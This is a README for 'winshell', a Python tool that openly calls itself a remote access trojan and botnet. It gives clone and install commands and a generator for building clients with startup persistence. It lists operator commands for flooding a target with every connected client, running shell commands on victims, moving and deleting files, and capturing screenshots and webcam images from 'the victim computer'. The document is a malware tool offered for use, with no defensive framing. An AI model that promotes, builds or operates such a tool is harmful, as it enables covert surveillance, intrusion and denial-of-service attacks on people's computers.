# winshell

**winshell is a python opensource RAT and Botnet**

### Installation
 - ####     Windows
   - `git clone https://github.com/Z4RK/winshell.git`
   - `cd winshell`
   - `pip install -r requierements.txt`
 - #### Linux
   - `git clone https://github.com/Z4RK/winshell.git`
   - `cd winshell`
   - `./install.sh`
   - `pip install -r requierements.txt`

### Features
 - The client can be compiled into an executable file
 - Supports multi-clients
 - The server can be run on Linux / Windows
 - The program can perform denial of service attacks with all clients connected to the server
 - Can execute all shell commands
 - Can upload and download file
 - Can run the client at startup
 - Can browse files & more...
 
### Usage
 - #### Generate the client
   - `python generate.py --host <server hostname> --port <port to use> [--out <output name>|--addstartup]`
 - #### Server commands
   - **Commands in the winshell menu**
     - `list client` list all clients connected on the server
     - `interact <client id>` start a session with a client
     - `flood <url/ip>` do a denial of service attacks with all clients connected
     - `quit` quit winshell
   - **Commands with a remote session**
     - `help` show this message
     - `upload <arg>` upload a file
     - `download <arg>` download a file
     - `cd <arg>` change directory
     - `ls` list files in current directory
     - `rm <arg>` remove a file
     - `rmdir <arg>` remove a directory
     - `screenshot` take a screenshot from the victim computer
     - `webcam_snap` taka a webcam picture form the victim computer
     - `getpid` get the current process id
     - `ps` list running process
     - `search <arg>` filter running process by name
     - `currentporcess` get the current process run on the victim computer
     - `force <arg>` do a shell command with an output (ipconfig, dir)
     - `force2 <arg>` do a shell command without an output(mkdir, start...)
     - `quit` quit the session
     # 
     
     [![PythonV](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/download/releases/2.7/)
